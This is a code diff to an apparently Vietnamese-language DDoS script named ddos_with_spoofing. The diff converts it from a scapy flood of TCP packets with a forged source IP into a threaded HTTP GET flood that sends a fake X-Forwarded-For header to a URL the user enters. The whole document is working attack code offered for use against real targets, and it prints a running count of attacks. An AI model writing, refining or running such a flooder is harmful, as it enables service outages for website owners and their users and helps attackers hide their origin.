@@ -2,7 +2,8 @@
 import os
 import threading
 import time
-from scapy.all import IP, TCP, send
+import requests
+from urllib.parse import urlparse
 from colorama import Fore, Style
 
 def ddos_with_spoofing():
@@ -19,11 +20,14 @@ def ddos_with_spoofing():
             break
 
     while True:
-        target_ip = input(Fore.RED + Style.BRIGHT + "NHẬP IP CỦA MỤC TIÊU: ")
-        if target_ip:
+        target_url = input(Fore.RED + Style.BRIGHT + "NHẬP URL CỦA MỤC TIÊU: ")
+        parsed_url = urlparse(target_url)
+        if parsed_url.scheme and parsed_url.netloc:
+            target_host = parsed_url.netloc
+            target_path = parsed_url.path if parsed_url.path else "/"
             break
         else:
-            print("IP không hợp lệ. Vui lòng thử lại.")
+            print("URL không hợp lệ. Vui lòng thử lại.")
 
     fake_ip = input("NHẬP IP GIẢ: ")
 
@@ -36,7 +40,7 @@ def ddos_with_spoofing():
         else:
             break
 
-    print(f"Đang thực hiện Ddos với IP giả {fake_ip} trên {target_ip} (Cổng: {target_port})")
+    print(f"Đang thực hiện Ddos với IP giả {fake_ip} trên {target_url} (Cổng: {target_port})")
     print(Fore.YELLOW + Style.BRIGHT + "[THÔNG TIN!]" + Fore.WHITE + " Nếu thông tin trên không chính xác, bạn có thể khởi động lại script và nhập lại chi tiết đúng!!")
 
     time.sleep(4)
@@ -49,15 +53,19 @@ def ddos_with_spoofing():
     time.sleep(1)
 
     attack_num = 0
+
     def attack():
         nonlocal attack_num
+        headers = {
+            'Host': target_host,
+            'X-Forwarded-For': fake_ip
+        }
         while True:
             try:
-                packet = IP(src=fake_ip, dst=target_ip) / TCP(dport=target_port)
-                send(packet, verbose=False)
+                response = requests.get(f"http://{target_host}:{target_port}{target_path}", headers=headers)
                 attack_num += 1
-                print(f"Gói tin đã gửi! Số lần tấn công: {attack_num}")
-            except Exception as e:
+                print(f"Gói tin đã gửi! Số lần tấn công: {attack_num} - Mã phản hồi: {response.status_code}")
+            except requests.RequestException as e:
                 print(f"Lỗi: {e}")
                 break
 
